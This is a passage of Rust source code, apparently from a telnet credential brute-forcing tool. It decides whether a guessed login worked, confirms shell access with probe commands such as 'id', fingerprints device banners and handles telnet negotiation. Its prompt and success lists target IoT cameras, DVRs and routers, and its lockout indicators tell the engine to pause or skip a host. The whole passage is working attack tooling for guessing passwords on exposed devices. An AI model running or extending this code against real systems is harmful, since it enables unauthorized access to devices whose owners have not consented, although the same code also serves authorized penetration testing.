                Ok(Ok(0)) => {
                    saw_eof = true;
                    break;
                }
                _ => {}
            }
            if elapsed > Duration::from_millis(500) {
                break;
            }
        }
    }

    // 7. Connection closed right after password → almost always auth failure
    if saw_eof && buf.trim().is_empty() {
        return Ok(false);
    }

    // 8. Final heuristic on everything collected
    match classify_response(&buf, cfg) {
        AuthSignal::Failure | AuthSignal::Reprompt => return Ok(false),
        AuthSignal::Lockout => return Err(anyhow!("Rate limited / locked out")),
        AuthSignal::Success => return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await,
        AuthSignal::Ambiguous => {}
    }

    // 9. Last resort: structural prompt analysis on the tail of the buffer
    if looks_like_shell_prompt(&buf) {
        return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
    }

    // Ambiguous — no clear signal
    Ok(false)
}

/// Classification of auth response.
enum AuthSignal {
    Success,
    Failure,
    Reprompt,
    Lockout,
    Ambiguous,
}

/// Classify the accumulated response buffer against known indicators.
/// Checks the full buffer for failure/lockout/reprompt (they appear anywhere),
/// but only checks the TAIL for success (avoids MOTD false positives).
fn classify_response(buf: &str, cfg: &TelnetConfig) -> AuthSignal {
    let lower = buf.to_lowercase();

    // Lockout has highest priority — must signal the engine to pause
    if has_any(&lower, &cfg.lockout_indicators) {
        return AuthSignal::Lockout;
    }

    // Failure indicators — checked against full buffer
    if has_any(&lower, &cfg.failure_indicators) {
        return AuthSignal::Failure;
    }

    // Re-prompt for credentials — device restarted the login cycle
    if has_any(&lower, &cfg.login_prompts) || has_any(&lower, &cfg.password_prompts) {
        return AuthSignal::Reprompt;
    }

    // Success — only check the TAIL of the buffer (last 512 bytes) to avoid
    // matching MOTD/banner text that happens to contain "welcome" or "login"
    let tail_start = lower.len().saturating_sub(512);
    let tail = &lower[tail_start..];
    if has_any(tail, &cfg.success_indicators) {
        return AuthSignal::Success;
    }

    AuthSignal::Ambiguous
}

/// After success indicators are detected, verify we have a real shell by
/// sending probe commands and checking for expected output.
/// This eliminates false positives from banners/MOTD containing success words.
///
/// Multi-probe strategy:
/// 1. `echo _RS_VERIFIED_` — works on most Linux/BusyBox shells
/// 2. `id` — works on Unix systems, restricted shells that block echo
/// 3. Prompt re-appearance check — works on network devices (Cisco, MikroTik, etc.)
async fn verify_shell(
    stream: &mut TcpStream,
    buf: &mut String,
    raw: &mut [u8],
    cfg: &TelnetConfig,
) -> Result<bool> {
    // Probe 1: echo command (most reliable for Linux/BusyBox)
    if send_line(stream, "echo _RS_VERIFIED_", cfg.read_timeout).await.is_err() {
        // Write failed — connection dropped. The caller already matched success
        // indicators, so the login likely succeeded before the device closed.
        return Ok(true);
    }

    buf.clear();
    drain_and_negotiate(stream, buf, raw, Duration::from_secs(2)).await;

    if buf.contains("_RS_VERIFIED_") {
        return Ok(true);
    }

    // Check for auth rejection (false positive from MOTD matching success indicators)
    let lower = buf.to_lowercase();
    if has_any(&lower, &cfg.failure_indicators) || has_any(&lower, &cfg.login_prompts) || has_any(&lower, &cfg.password_prompts) {
        return Ok(false);
    }

    // Probe 2: `id` command — works on restricted shells that don't have echo
    if send_line(stream, "id", cfg.read_timeout).await.is_ok() {
        let prev_len = buf.len();
        drain_and_negotiate(stream, buf, raw, Duration::from_secs(2)).await;
        let new_text = &buf[prev_len..];
        let new_lower = new_text.to_lowercase();

        // `id` output contains "uid=" on Unix
        if new_lower.contains("uid=") {
            return Ok(true);
        }

        // Check again for auth rejection after second probe
        if has_any(&new_lower, &cfg.failure_indicators) || has_any(&new_lower, &cfg.login_prompts) {
            return Ok(false);
        }
    }

    // Probe 3: structural prompt analysis — the device re-prompted after our commands,
    // which means it accepted the login and is waiting for more input
    if looks_like_shell_prompt(buf) {
        return Ok(true);
    }

    // Got non-empty output that isn't a rejection — likely a shell
    if !buf.trim().is_empty() {
        return Ok(true);
    }

    // Timeout with no response — assume success since indicators matched before verification
    Ok(true)
}

// ============================================================
// Protocol helpers
// ============================================================

/// Grab banner text from a telnet server without sending credentials.
/// Used for fingerprinting the device type before credential selection.
async fn grab_banner(addr: &str, cfg: &TelnetConfig) -> Option<String> {
    let mut stream = crate::utils::network::tcp_connect(addr, cfg.connect_timeout)
        .await
        .ok()?;
    let _ = stream.set_nodelay(true);
    let mut buf = String::with_capacity(512);
    let mut raw = [0u8; 4096];
    drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_secs(2)).await;
    let _ = stream.shutdown().await;
    if buf.trim().is_empty() { None } else { Some(buf) }
}

/// Read from stream, process IAC inline, strip ANSI/control chars,
/// append clean text to `buf` (bounded to RECENT_BUF_CAP).
/// Returns count of clean bytes added.
///
/// Safety caps:
/// - `MAX_IAC_ROUNDS` prevents infinite WILL/DO cycling from malicious servers
/// - `MAX_DRAIN_BYTES` prevents memory exhaustion from endless data
async fn drain_and_negotiate(
    stream: &mut TcpStream,
    buf: &mut String,
    raw: &mut [u8],
    read_timeout: Duration,
) -> usize {
    let mut total = 0usize;
    let mut total_bytes_read = 0usize;
    let mut iac_rounds = 0usize;
    let deadline = tokio::time::Instant::now() + read_timeout;

    loop {
        let now = tokio::time::Instant::now();
        if now >= deadline || total_bytes_read >= MAX_DRAIN_BYTES {
            break;
        }
        let remaining = deadline - now;

        match timeout(remaining, stream.read(raw)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                total_bytes_read += n;
                let (clean, responses) = process_iac(&raw[..n]);

                // Batch all IAC responses into a single write to reduce syscalls
                if !responses.is_empty() && iac_rounds < MAX_IAC_ROUNDS {
                    let batch_count = (MAX_IAC_ROUNDS - iac_rounds).min(responses.len());
                    let total_len: usize = responses[..batch_count].iter().map(|r| r.len()).sum();
                    let mut batch = Vec::with_capacity(total_len);
                    for resp in &responses[..batch_count] {
                        batch.extend_from_slice(resp);
                    }
                    if let Err(e) = stream.write_all(&batch).await { crate::meprintln!("[!] Write error: {}", e); }
                    if let Err(e) = stream.flush().await { crate::meprintln!("[!] Flush error: {}", e); }
                    iac_rounds += batch_count;
                }

                let text = strip_control_and_ansi(&clean);
                if !text.is_empty() {
                    buf.push_str(&text);
                    if buf.len() > RECENT_BUF_CAP {
                        let excess = buf.len() - RECENT_BUF_CAP;
                        buf.drain(..excess);
                    }
                    total += text.len();
                }
                continue;
            }
            _ => break,
        }
    }
    total
}

/// Process raw bytes: extract IAC sequences and generate responses.
/// Returns (clean_data_without_iac, iac_responses_to_send).
fn process_iac(data: &[u8]) -> (Vec<u8>, Vec<Vec<u8>>) {
    let mut clean = Vec::with_capacity(data.len());
    let mut responses: Vec<Vec<u8>> = Vec::new();
    let mut i = 0;

    while i < data.len() {
        if data[i] != IAC {
            clean.push(data[i]);
            i += 1;
            continue;
        }
        // IAC at end of chunk with no following byte — skip it
        // (the next read will get the complete IAC sequence)
        if i + 1 >= data.len() {
            break;
        }

        match data[i + 1] {
            WILL => {
                if i + 2 < data.len() {
                    responses.push(negotiate_will(data[i + 2]));
                    i += 3;
                } else {
                    i = data.len();
                }
            }
            DO => {
                if i + 2 < data.len() {
                    responses.push(negotiate_do(data[i + 2]));
                    i += 3;
                } else {
                    i = data.len();
                }
            }
            WONT => {
                // Acknowledge: skip 3 bytes (IAC WONT <option>)
                i += if i + 2 < data.len() {
                    3
                } else {
                    data.len() - i
                };
            }
            DONT => {
                i += if i + 2 < data.len() {
                    3
                } else {
                    data.len() - i
                };
            }
            SB => {
                // Subnegotiation — find IAC SE, possibly respond.
                // Cap scan at 4096 bytes to prevent unbounded processing.
                let sb_start = i + 2;
                i += 2;
                let sb_limit = (i + 4096).min(data.len());
                while i < sb_limit {
                    if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
                        let sb_len = i - sb_start;
                        if sb_len >= 2 {
                            match data[sb_start] {
                                TERMINAL_TYPE if data[sb_start + 1] == TT_SEND => {
                                    let mut r = vec![IAC, SB, TERMINAL_TYPE, TT_IS];
                                    r.extend_from_slice(b"xterm");
                                    r.extend_from_slice(&[IAC, SE]);
                                    responses.push(r);
                                }
                                TERMINAL_SPEED if data[sb_start + 1] == TT_SEND => {
                                    // Respond with 38400,38400
                                    let mut r = vec![IAC, SB, TERMINAL_SPEED, TT_IS];
                                    r.extend_from_slice(b"38400,38400");
                                    r.extend_from_slice(&[IAC, SE]);
                                    responses.push(r);
                                }
                                NEW_ENVIRON | ENVIRON if data[sb_start + 1] == TT_SEND => {
                                    // Empty environment response
                                    responses.push(vec![IAC, SB, data[sb_start], TT_IS, IAC, SE]);
                                }
                                _ => {}
                            }
                        }
                        i += 2;
                        break;
                    }
                    i += 1;
                }
            }
            IAC => {
                // Escaped 0xFF literal
                clean.push(IAC);
                i += 2;
            }
            GA | NOP => {
                i += 2;
            }
            _ => {
                // Unknown 2-byte command — skip
                i += 2;
            }
        }
    }

    (clean, responses)
}

/// Respond to server WILL <option>.
fn negotiate_will(option: u8) -> Vec<u8> {
    match option {
        ECHO | SGA => vec![IAC, DO, option],
        _ => vec![IAC, DONT, option],
    }
}

/// Respond to server DO <option>.
fn negotiate_do(option: u8) -> Vec<u8> {
    match option {
        SGA => vec![IAC, WILL, option],
        TERMINAL_TYPE => vec![IAC, WILL, option],
        NAWS => {
            // Accept and immediately send window size (80x24)
            let mut r = vec![IAC, WILL, NAWS];
            r.extend_from_slice(&[IAC, SB, NAWS, 0, 80, 0, 24, IAC, SE]);
            r
        }
        TERMINAL_SPEED => vec![IAC, WILL, option],
        NEW_ENVIRON | ENVIRON => vec![IAC, WILL, option],
        LINEMODE | ECHO | X_DISPLAY_LOCATION => vec![IAC, WONT, option],
        _ => vec![IAC, WONT, option],
    }
}

/// Strip ANSI escape sequences AND control characters (except newline/tab).
fn strip_control_and_ansi(data: &[u8]) -> String {
    let mut out = Vec::with_capacity(data.len());
    let mut i = 0;

    while i < data.len() {
        match data[i] {
            0x1b => {
                // ESC — start of escape sequence
                i += 1;
                if i >= data.len() {
                    break;
                }
                match data[i] {
                    b'[' => {
                        // CSI: ESC [ ... (final byte 0x40-0x7E)
                        i += 1;
                        while i < data.len() && !(0x40..=0x7E).contains(&data[i]) {
                            i += 1;
                        }
                        if i < data.len() {
                            i += 1;
                        }
                    }
                    b']' => {
                        // OSC: ESC ] ... (terminated by BEL or ST)
                        i += 1;
                        while i < data.len() {
                            if data[i] == 0x07 {
                                i += 1;
                                break;
                            }
                            if data[i] == 0x1b && i + 1 < data.len() && data[i + 1] == b'\\' {
                                i += 2;
                                break;
                            }
                            i += 1;
                        }
                    }
                    b'(' | b')' => {
                        // Charset designation — skip 1 more byte
                        i += 1;
                        if i < data.len() {
                            i += 1;
                        }
                    }
                    _ => {
                        // Single-char escape (ESC =, ESC >, etc.) — skip it
                        i += 1;
                    }
                }
            }
            // C1 control codes (8-bit CSI) — rare but some terminals use 0x9B as CSI
            0x9b => {
                i += 1;
                while i < data.len() && !(0x40..=0x7E).contains(&data[i]) {
                    i += 1;
                }
                if i < data.len() {
                    i += 1;
                }
            }
            // Control characters to strip: NUL, BEL, BS, DEL, and other C0 noise
            0x00 | 0x07 | 0x08 | 0x7f => {
                i += 1;
            }
            // C1 range (0x80-0x9F except 0x9B handled above) — strip
            0x80..=0x9a | 0x9c..=0x9f => {
                i += 1;
            }
            // Keep printable bytes, newlines, tabs, carriage returns
            _ => {
                out.push(data[i]);
                i += 1;
            }
        }
    }

    String::from_utf8_lossy(&out).to_string()
}

/// Send a line with CR LF (RFC 854 standard line ending).
async fn send_line(stream: &mut TcpStream, data: &str, write_timeout: Duration) -> Result<()> {
    let mut buf = Vec::with_capacity(data.len() + 2);
    buf.extend_from_slice(data.as_bytes());
    buf.extend_from_slice(b"\r\n");

    timeout(write_timeout, stream.write_all(&buf))
        .await
        .map_err(|_| anyhow!("Write timeout"))?
        .map_err(|e| anyhow!("Write error: {}", e))?;

    if let Err(e) = stream.flush().await { crate::meprintln!("[!] Flush error: {}", e); }
    Ok(())
}

/// Check if any needle (lowercase) appears in the haystack (already lowercase).
fn has_any(haystack: &str, needles: &[String]) -> bool {
    needles.iter().any(|n| haystack.contains(n.as_str()))
}

/// Check if text ends with a character commonly used as a prompt indicator.
fn ends_with_prompt_char(s: &str) -> bool {
    let trimmed = s.trim_end();
    matches!(
        trimmed.as_bytes().last(),
        Some(b':' | b'>' | b'$' | b'#' | b'%' | b'~')
    )
}

/// Heuristic: does the output look like a successful shell prompt?
///
/// Examines the last 3 non-empty lines of the buffer. This handles devices
/// that send a blank line or MOTD after the prompt. Uses structural analysis:
/// - `user@host:path$` or `user@host:path#` (Linux)
/// - `hostname>` or `hostname#` (network devices)
/// - `(config)#` (config mode)
/// - Short line ending with `$`, `#`, `>`, `~`, `%`
fn looks_like_shell_prompt(s: &str) -> bool {
    let candidates: Vec<&str> = s
        .lines()
        .rev()
        .filter(|l| !l.trim().is_empty())
        .take(3)
        .collect();

    for &raw_line in &candidates {
        let line = raw_line.trim();

        // Prompt lines are short
        if line.len() > 100 || line.is_empty() {
            continue;
        }

        let last_char = match line.chars().last() {
            Some(c) => c,
            None => continue,
        };

        // Must end with a prompt character (with or without trailing space)
        let effective_last = if last_char == ' ' {
            line.trim_end().chars().last().unwrap_or('\0')
        } else {
            last_char
        };

        if !matches!(effective_last, '$' | '#' | '>' | '~' | '%') {
            continue;
        }

        let lower = line.to_lowercase();

        // Reject known false positives
        if [
            "error",
            "denied",
            "fail",
            "invalid",
            "refused",
            "closed",
            "http/",
            "html>",
            "<!doctype",
            "<html",
            "not found",
            "no such",
            "command not",
            "syntax error",
            "incorrect",
            "password:",
            "login:",
            "username:",
            "timed out",
            "connection",
        ]
        .iter()
        .any(|fp| lower.contains(fp))
        {
            continue;
        }

        // High-confidence: matches `user@host` pattern (Linux/Unix)
        if line.contains('@') && (effective_last == '$' || effective_last == '#') {
            return true;
        }

        // High-confidence: matches `(something)#` or `(something)>` (network config mode)
        if line.contains('(') && line.contains(')') && matches!(effective_last, '#' | '>') {
            return true;
        }

        // Medium-confidence: short line ending with prompt char, not a sentence
        // Real prompts don't usually contain spaces (except after hostname)
        // or if they do, they're very short like "/ # " (busybox)
        let word_count = line.split_whitespace().count();
        if word_count <= 4 && line.len() < 50 {
            return true;
        }
    }

    false
}

/// Classify error message as retryable.
fn is_retryable_error(msg: &str) -> bool {
    let lower = msg.to_lowercase();
    // Rate limiting / lockout is NOT retryable — the engine should skip this host
    if lower.contains("rate limit") || lower.contains("locked out") {
        return false;
    }
    lower.contains("timeout")
        || lower.contains("timed out")
        || lower.contains("connection refused")
        || lower.contains("connection reset")
        || lower.contains("broken pipe")
        || lower.contains("network unreachable")
        || lower.contains("no route to host")
        || lower.contains("resource temporarily unavailable")
        || lower.contains("too many open files")
}

// ============================================================
// Default prompt / indicator lists (all lowercase for matching)
// ============================================================

fn default_login_prompts() -> Vec<String> {
    [
        // English
        "login:",
        "login :",
        "username:",
        "username :",
        "user:",
        "user :",
        "user name:",
        "user name :",
        "account:",
        "login name:",
        "auth login:",
        "user id:",
        "userid:",
        // German
        "benutzername:",
        "anmeldung:",
        // Spanish
        "usuario:",
        "nombre de usuario:",
        // French
        "identifiant:",
        "nom d'utilisateur:",
        // Portuguese
        "usu\u{e1}rio:",
        // Turkish
        "kullan\u{131}c\u{131} ad\u{131}:",
        // Russian (transliterated — actual Cyrillic prompts are rare in telnet)
        "login:",
        // Japanese
        "\u{30e6}\u{30fc}\u{30b6}\u{30fc}\u{540d}:", // ユーザー名:
        // IoT-specific
        "dvr login:",
        "camera login:",
        "nvr login:",
        "router login:",
        "switch login:",
        "modem login:",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

fn default_password_prompts() -> Vec<String> {
    [
        // English
        "password:",
        "password :",
        "pass:",
        "pass :",
        "passcode:",
        "passwd:",
        "secret:",
        "credential:",
        // German
        "kennwort:",
        "passwort:",
        // Spanish
        "contrase\u{f1}a:",
        "clave:",
        // French
        "mot de passe:",
        // Portuguese
        "senha:",
        // Turkish
        "\u{15f}ifre:",
        "parola:",
        // IoT
        "enter password:",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

fn default_success_indicators() -> Vec<String> {
    // These are checked against the TAIL of the response buffer (last 512 bytes)
    // to avoid false positives from MOTD/banner text earlier in the session.
    [
        // Shell prompt patterns — reliable because they appear at the prompt position
        "$ ",
        "# ",
        "> ",
        "~ ",
        "% ",
        // Also match without trailing space (end of buffer)
        "\n$ ",
        "\n# ",
        "\n> ",
        // Explicit auth success messages
        "last login",
        "logged in",
        "login successful",
        "login ok",
        "authentication successful",
        "successfully logged",
        "authenticated.",
        // BusyBox / embedded Linux (definitive shell indicators)
        "busybox",
        "built-in shell",
        // BusyBox-style prompts
        "ash#",
        "sh-",
        "/ # ",
        "~ # ",
        // IoT / camera / DVR specific (firmware shell prompts)
        "hi3518",
        "xiongmai#",
        "miwifi#",
        "v380#",
        "dvrdvs#",
        "(none)#",
        "(none) #",
        // Network device shells
        "router>",
        "router#",
        "switch>",
        "switch#",
        "firewall>",
        "firewall#",
        "zte>",
        "huawei>",
        "mikrotik>",
        "ubnt>",
        "cisco>",
        "cisco#",
        "edgeos>",
        "edgeos#",
        "routeros>",
        // Linux root prompt patterns
        "root@",
        // Common IoT device CLI indicators
        "main menu",
        "device management",
        "system config",
        "configuration menu",
        // Chinese
        "\u{6b22}\u{8fce}",                 // 欢迎 (welcome)
        "\u{8ba4}\u{8bc1}\u{6210}\u{529f}", // 认证成功 (auth successful)
        "\u{767b}\u{5f55}\u{6210}\u{529f}", // 登录成功 (login successful)
        "\u{5df2}\u{8fde}\u{63a5}",         // 已连接 (connected)
        // Spanish
        "bienvenido",
        "sesi\u{f3}n iniciada",
        // Portuguese
        "bem-vindo",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

fn default_lockout_indicators() -> Vec<String> {
    [
        "too many failed",
        "too many attempts",
        "too many connections",
        "account locked",
        "account disabled",
        "temporarily blocked",
        "please wait",
        "try again later",
        "banned",
        "lockout",
        "locked out",
        "rate limit",
        "max retries exceeded",
        "connection limit",
        "\u{8d26}\u{53f7}\u{9501}\u{5b9a}", // 账号锁定 (account locked)
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

fn default_failure_indicators() -> Vec<String> {
    [
        // English
        "incorrect",
        "failed",
        "denied",
        "invalid",
        "bad password",
        "login incorrect",
        "authentication failure",
        "access denied",
        "wrong password",
        "login failed",
        "auth failed",
        "not authorized",
        "error: invalid",
        "permission denied",
        "credentials rejected",
        "unable to authenticate",
        // German
        "falsches kennwort",
        "zugriff verweigert",
        // Spanish
        "contrase\u{f1}a incorrecta",
        "acceso denegado",
        // French
        "mot de passe incorrect",
        "acc\u{e8}s refus\u{e9}",
        // Additional English patterns
        "login unsuccessful",
        "bad login",
        "bad username",
        "no such user",
        "connection closed by foreign host",
        // Chinese
        "\u{5bc6}\u{7801}\u{9519}\u{8bef}", // 密码错误 (wrong password)
        "\u{8ba4}\u{8bc1}\u{5931}\u{8d25}", // 认证失败 (auth failed)
        "\u{62d2}\u{7edd}\u{8bbf}\u{95ee}", // 拒绝访问 (access denied)
        "\u{767b}\u{5f55}\u{5931}\u{8d25}", // 登录失败 (login failed)
        // Japanese
        "\u{30ed}\u{30b0}\u{30a4}\u{30f3}\u{5931}\u{6557}", // ログイン失敗 (login failed)
        // Korean
        "\u{b85c}\u{adf8}\u{c778} \u{c2e4}\u{d328}", // 로그인 실패 (login failed)
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}
